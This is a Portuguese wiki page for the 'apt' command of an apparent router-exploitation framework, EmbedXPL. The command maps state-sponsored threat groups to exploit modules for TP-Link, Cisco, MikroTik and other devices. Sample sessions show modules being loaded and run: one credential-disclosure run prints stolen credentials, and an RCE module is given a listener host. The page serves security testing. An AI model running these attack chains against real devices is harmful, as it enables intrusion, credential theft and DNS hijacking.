# Catálogo APT (Comando `apt`)

**Idioma:** Português (pt-BR). **English:** [../en-US/17-apt-catalog.md](../en-US/17-apt-catalog.md)

---

## Visão geral

O comando `apt` fornece uma visão centrada em atores de ameaça do catálogo de exploits. Ele mapeia grupos APT (Advanced Persistent Threat) do mundo real para os módulos EmbedXPL que reproduzem suas técnicas de ataque, permitindo que equipes de segurança testem suas defesas contra cenários específicos de ameaças de estado-nação.

Todos os grupos visam dispositivos de rede: roteadores, switches, firewalls, appliances VPN, câmeras IP e dispositivos IoT edge.

---

## Sintaxe

```
apt                         Listar todos os grupos APT
apt list                    Igual ao anterior
apt show <group_id>         Exibir cadeia de ataque de um grupo
apt search <palavra-chave>  Buscar grupos por dispositivo ou CVE
apt run <group_id>          Carregar o primeiro módulo de ataque de um grupo
apt run <group_id> <index>  Carregar um ataque específico pelo número do índice
```

---

## `apt` / `apt list` — listar todos os grupos

```
exf> apt

┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│                          APT Groups Targeting Network Devices (8)                                │
├────────────────────┬──────────────────────────────┬──────────┬───────────────────────┬─────────┤
│ ID                 │ Name                          │ Country  │ Aliases               │ Attacks │
├────────────────────┼──────────────────────────────┼──────────┼───────────────────────┼─────────┤
│ apt28              │ APT28 / Forest Blizzard       │ Russia   │ Fancy Bear, Sofacy    │   6     │
│ volt_typhoon       │ Volt Typhoon                  │ China    │ BRONZE SILHOUETTE     │   3     │
│ sandworm           │ Sandworm / APT44              │ Russia   │ Voodoo Bear, IRIDIUM  │   3     │
│ quad7              │ Quad7 / CovertNetwork-1658    │ China    │ 7777 Botnet           │   2     │
│ turla              │ Turla                         │ Russia   │ Snake, Venomous Bear  │   2     │
│ lazarus            │ Lazarus Group                 │ N.Korea  │ HIDDEN COBRA, APT38   │   2     │
│ muddywater         │ MuddyWater                    │ Iran     │ MERCURY, SeedWorm     │   2     │
│ unc2452            │ UNC2452 / Cozy Bear           │ Russia   │ APT29, NOBELIUM       │   2     │
└────────────────────┴──────────────────────────────┴──────────┴───────────────────────┴─────────┘

[*] Use 'apt show <group_id>' for details or 'apt run <group_id>' to execute
```

---

## `apt show apt28` — detalhe da cadeia de ataque

```
exf> apt show apt28

╔════════════════════════════════════════════════════════════════════════════════════╗
║  APT Profile: apt28                                                                ║
╠════════════════════════════════════════════════════════════════════════════════════╣
║  APT28 / Forest Blizzard (Russia)                                                  ║
║                                                                                    ║
║  Unidade Militar 26165 do GRU russo. Desde agosto de 2025, explora roteadores    ║
║  SOHO para sequestrar DNS e realizar ataques AiTM roubando credenciais            ║
║  Outlook/OAuth. 200+ organizações e 5.000+ dispositivos comprometidos             ║
║  por Microsoft/NCSC (abril de 2026).                                              ║
╚════════════════════════════════════════════════════════════════════════════════════╝

┌───┬─────────────────────────────────┬─────────────────────────────────────┬──────────────────────────────┬─────────────────────────────────────────────────────────────────┬──────┐
│ # │ Phase                           │ Attack                              │ CVEs                         │ Modules                                                         │ Auth │
├───┼─────────────────────────────────┼─────────────────────────────────────┼──────────────────────────────┼─────────────────────────────────────────────────────────────────┼──────┤
│ 0 │ Initial Access                  │ TP-Link WR841N Credential Disclosure│ CVE-2023-50224               │ exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224│ No  │
│ 1 │ Execution                       │ TP-Link Parental Control RCE        │ CVE-2025-9377                │ exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377  │ Yes │
│ 2 │ Impact                          │ TP-Link DNS Hijack (20+ models)     │ -                            │ exploits/routers/tplink/multi_dns_hijack_apt28                      │ Yes │
│ 3 │ Impact                          │ MikroTik DNS Hijack                 │ -                            │ exploits/routers/mikrotik/routeros_dns_hijack_apt28                 │ Yes │
│ 4 │ Detection                       │ DNS Hijack Detection (defensive)    │ -                            │ generic/dns_hijack_detector                                         │ No  │
│ 5 │ Full Kill Chain                 │ Full Chain AutoPwn                  │ CVE-2023-50224, CVE-2025-9377│ exploits/routers/tplink/apt28_full_chain_autopwn                    │ No  │
└───┴─────────────────────────────────┴─────────────────────────────────────┴──────────────────────────────┴─────────────────────────────────────────────────────────────────┴──────┘

[*] Use 'apt run apt28 [attack#]' to execute
```

---

## `apt show volt_typhoon`

```
exf> apt show volt_typhoon

╔════════════════════════════════════════════════════════════════╗
║  APT Profile: volt_typhoon                                     ║
╠════════════════════════════════════════════════════════════════╣
║  Volt Typhoon (China)                                          ║
║                                                                ║
║  Grupo patrocinado pelo estado chinês visando infraestrutura   ║
║  crítica dos EUA. Sequestra roteadores SOHO EOL (Cisco         ║
║  RV320/325, Netgear ProSafe) como infraestrutura de proxy para ║
║  movimento lateral furtivo em grades elétricas e sistemas de   ║
║  água. KV Botnet.                                              ║
╚════════════════════════════════════════════════════════════════╝

┌───┬─────────────────────┬────────────────────────────────────────┬──────────────────┬─────────────────────────────────────────────────────────────────┬──────┐
│ # │ Phase               │ Attack                                 │ CVEs             │ Modules                                                         │ Auth │
├───┼─────────────────────┼────────────────────────────────────────┼──────────────────┼─────────────────────────────────────────────────────────────────┼──────┤
│ 0 │ Initial Access      │ Cisco RV320 Command Injection          │ CVE-2019-1652, CVE-2019-1653│ exploits/routers/cisco/rv320_command_injection                 │ No   │
│ 1 │ Initial Access      │ Netgear ProSafe Default Credentials    │ -                │ creds/routers/netgear/ssh_default_creds                          │ No   │
│ 2 │ Credential Access   │ MikroTik Winbox Credential Disclosure  │ CVE-2018-14847   │ exploits/routers/mikrotik/winbox_cred_disclosure_cve_2018_14847  │ No   │
└───┴─────────────────────┴────────────────────────────────────────┴──────────────────┴─────────────────────────────────────────────────────────────────┴──────┘
```

---

## `apt show sandworm`

```
exf> apt show sandworm

╔════════════════════════════════════════════════════════════════════════════╗
║  APT Profile: sandworm                                                     ║
╠════════════════════════════════════════════════════════════════════════════╣
║  Sandworm / APT44 (Russia)                                                 ║
║                                                                            ║
║  Unidade GRU russa 74455. Conhecida por ataques destrutivos (grade de      ║
║  energia da Ucrânia, NotPetya). Desde 2022, pivotou para exploração de    ║
║  dispositivos edge mal configurados (roteadores, VPNs). Cyclops Blink      ║
║  visou ASUS/WatchGuard.                                                    ║
╚════════════════════════════════════════════════════════════════════════════╝

┌───┬───────────────┬────────────────────────────────────────┬──────────────────┬────────────────────────────────────────────────────────────────────────┬──────┐
│ # │ Phase         │ Attack                                 │ CVEs             │ Modules                                                                │ Auth │
├───┼───────────────┼────────────────────────────────────────┼──────────────────┼────────────────────────────────────────────────────────────────────────┼──────┤
│ 0 │ Initial Access│ ASUS Router Exploitation (Cyclops Blink)│ -               │ creds/routers/asus/ssh_default_creds                                   │ No   │
│ 1 │ Initial Access│ Cisco SNMP RCE                        │ CVE-2017-6742    │ generic/snmp/snmp_bruteforce                                           │ No   │
│ 2 │ Persistence   │ MikroTik Router Jailbreak             │ -                │ exploits/routers/mikrotik/routeros_jailbreak                           │ Yes  │
└───┴───────────────┴────────────────────────────────────────┴──────────────────┴────────────────────────────────────────────────────────────────────────┴──────┘
```

---

## `apt search` — buscar por dispositivo ou CVE

### Busca por palavra-chave de dispositivo

```
exf> apt search tplink

[+] APT28 / Forest Blizzard (Russia) — 6 attacks
  -> TP-Link WR841N Credential Disclosure [CVE-2023-50224]
  -> TP-Link Parental Control RCE [CVE-2025-9377]
  -> TP-Link DNS Hijack (20+ models) [Impact]
[+] Quad7 / CovertNetwork-1658 (China) — 2 attacks
  -> TP-Link WR841N Exploit Chain [CVE-2023-50224, CVE-2025-9377]
```

### Busca por CVE

```
exf> apt search CVE-2018-14847

[+] Volt Typhoon (China) — 3 attacks
  -> MikroTik Winbox Credential Disclosure [CVE-2018-14847]
```

### Busca sem resultados

```
exf> apt search nonexistent_device

[*] No APT groups found for 'nonexistent_device'
```

### Palavra-chave ausente

```
exf> apt search

[-] Usage: apt search <device_or_cve>
```

---

## `apt run <group_id>` — carregar o primeiro módulo de ataque

`apt run` carrega o primeiro módulo executável na cadeia de ataque do grupo e o coloca no contexto `current_module`. O usuário então define o alvo e executa o módulo interativamente.

```
exf> apt run apt28

[*] [Initial Access] TP-Link WR841N Credential Disclosure — loading exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224
[*] Module loaded. Set target and run with 'run' or 'check'

exf (tplink/wr841n_credential_disclosure_cve_2023_50224) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (tplink/wr841n_credential_disclosure_cve_2023_50224) > run

[*] Running module embedxpl.modules.exploits.routers.tplink.wr841n_credential_disclosure_cve_2023_50224...
[*] Connecting to http://192.168.1.1:80/loginFs/...
[+] Credentials disclosed:
    Username: admin
    Password: admin123
[+] Authentication bypass successful via CVE-2023-50224
```

---

## `apt run <group_id> <attack_index>` — carregar ataque específico

```
exf> apt run apt28 1

[*] [Execution] TP-Link Parental Control RCE — loading exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377
[*] Module loaded. Set target and run with 'run' or 'check'

exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > run
```

---

## `apt run` — ataque sem módulo executável

Alguns ataques são técnicas de detecção/análise sem módulos de exploit:

```
exf> apt run apt28 4

[*] Skipping 'DNS Hijack Detection' — no executable module
```

---

## Casos de erro

### Grupo desconhecido

```
exf> apt show unknown_group

[-] Unknown group: unknown_group

exf> apt run bad_group

[-] Unknown group: bad_group
```

### Índice de ataque inválido

```
exf> apt run apt28 abc

[-] Attack index must be a number
```

### Subcomando desconhecido

```
exf> apt foo

[-] Unknown subcommand: foo. Use 'apt', 'apt list', 'apt show', 'apt search', 'apt run'
```

---

## Tabela de referência de grupos APT

| Group ID | Nome | País | MITRE | Alvos principais |
|----------|------|------|-------|-----------------|
| `apt28` | APT28 / Forest Blizzard | Russia | G0007 | Roteadores SOHO (TP-Link, MikroTik), sequestro DNS |
| `volt_typhoon` | Volt Typhoon | China | G1017 | Cisco RV320/325, Netgear ProSafe, MikroTik |
| `sandworm` | Sandworm / APT44 | Russia | G0034 | Roteadores ASUS, Cisco IOS, MikroTik |
| `quad7` | Quad7 / CovertNetwork-1658 | China | C0055 | TP-Link, Zyxel, Ruckus, ASUS (botnet) |
| `turla` | Turla | Russia | G0010 | Ubiquiti EdgeRouters, túneis SSH reversos |
| `lazarus` | Lazarus Group | Coreia do Norte | G0032 | Cisco, Juniper, roteadores do setor financeiro |
| `muddywater` | MuddyWater | Iran | G0069 | Fortinet, Cisco, perímetro de rede |
| `unc2452` | UNC2452 / Cozy Bear | Russia | G0016 | SolarWinds, appliances de perímetro |

---

[Hub da Wiki](../README.md)
